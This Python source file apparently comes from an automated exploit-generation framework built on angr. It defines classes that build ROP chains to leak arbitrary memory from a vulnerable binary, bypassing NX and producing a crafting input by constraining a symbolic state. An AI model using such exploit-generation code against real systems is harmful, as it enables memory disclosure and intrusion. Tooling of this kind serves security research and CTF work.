import logging
from rex.exploit import Exploit

l = logging.getLogger("rex.exploit.leaker")

class Leaker(Exploit):
    '''
    Exploit wrapper for leaker an arbitray address
    '''

    def __init__(self, binary, exploit_state):
        '''
        :param exploit_state: SimState which should have most things constrained
            by the payload and the address to leak
        '''
        super(Leaker, self).__init__(binary, exploit_state)

    def dumps(self, addr, length):
        raise NotImplementedError

class ROPLeaker(Leaker):
    '''
    Exploit which uses ROP to leak the memory at a given address
    '''

    def __init__(self, binary, exploit_state, chain_addr, chain_len, uncontrolled_regs, rop):
        '''
        :param chain_addr: address the chain must be placed for exploitation
        :param chain_len: max length of the chain
        :param uncontrolled_regs: register uncontrolled by rop, but controlled by exploit_state
        :param rop: angr ROP object which can create chains
        '''
        super(ROPLeaker, self).__init__(binary, exploit_state)
        self.bypasses_nx = True

        self.chain_addr = chain_addr
        self.chain_len = chain_len
        self.uncontrolled_regs = uncontrolled_regs
        self.rop_engine = rop

    def dumps(self, addr, length):

        # create the chain
        chain = self.rop_engine.do_syscall(2, [1, addr, length], ignore_registers=self.uncontrolled_regs)

        assert chain.payload_len <= self.chain_len, "angrop's built chain is too long!"

        cbvv = self.exploit_state.BVV(chain.payload_str())

        cp = self.exploit_state.copy()
        cp.add_constraints(cp.memory.load(self.chain_addr, chain.payload_len) == cbvv)

        cp = self._windup_state(cp, to_syscall=True)

        # XXX there's gotta be a better way to make guarantees about the register state
        # at syscall time and at crash time
        cp.add_constraints(cp.regs.eax == 2)
        cp.add_constraints(cp.regs.ebx == 1)
        cp.add_constraints(cp.regs.ecx == addr)
        cp.add_constraints(cp.regs.edx == length)
        cp.add_constraints(cp.regs.esi == 0)

        return cp.posix.dumps(0)
